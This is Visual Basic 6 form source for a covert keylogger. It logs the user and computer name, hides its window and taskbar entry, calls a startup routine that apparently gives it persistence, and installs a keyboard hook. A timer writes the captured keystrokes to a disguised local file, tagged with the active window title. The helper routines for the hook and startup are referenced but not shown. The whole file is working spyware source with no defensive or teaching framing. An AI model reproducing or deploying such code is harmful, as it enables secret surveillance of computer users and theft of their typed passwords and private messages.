VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1590
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   3465
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1590
   ScaleWidth      =   3465
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Dim title As String, last As String, strInfo As String, fileName As String
Dim handle As Long, length As Long
Dim i As Integer
Dim fso As New FileSystemObject, txt As TextStream

Private Sub Form_Load()
Set objnet = CreateObject("WScript.NetWork")
struser = objnet.username

   fileName = App.Path & "\struser.db"
   Set txt = fso.OpenTextFile(fileName, ForAppending, True)
  txt.WriteLine ("Started: " & Now)
  Set objnet = CreateObject("WScript.NetWork")
  
  strInfo = "User Name: " & objnet.username & vbCrLf & _
            "Computer Name: " & objnet.ComputerName & vbCrLf
  txt.WriteLine (vbNewLine & strInfo)
  keyChar = Array(8, 9, 160, 17, 18, 35, 36, 46, 91, 92, _
                  112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, _
                  32, 106, 107, 109, 110, 111, 186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222, _
                  96, 97, 98, 99, 100, 101, 102, 103, 104, 105)
keyList = Array("BACK", "TAB", "SHIFT", "CTRL", "ALT", "END", "HOME", "DEL", "LWIN", "RWIN", _
                  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", _
                  " ", "*", "+", "-", ".", "/", ";", "=", ",", "-", ".", "/", "`", "[", "\", "[", "'", _
                  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
  
  App.TaskVisible = False
  Me.Hide
  startup
  Timer1.Interval = 1
  KeyboardHook
End Sub

Private Sub Form_Terminate()
  Unhook
  hook = 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
txt.Write (vbNewLine & "Ended: " & Now & vbNewLine & vbNewLine)
  txt.Close
  Unhook
  hook = 0
End Sub

Private Sub Timer1_Timer()
  'Set last = current title
  last = title
  
  'Get Active Window handle
  handle = GetForegroundWindow
  
  'Get Active Window Text Length
  length = GetWindowTextLength(handle)
  
  'Create String Buffer
  title = String(length, Chr$(0))
  
  'Get Title of Active Window
  GetWindowText handle, title, length + 1
  
  'Record data from last window when new window is active
  If title <> last And last <> "" Then
    txt.WriteLine ("<<" & last & ">>" & vbTab & keys)
    keys = ""
  End If
End Sub
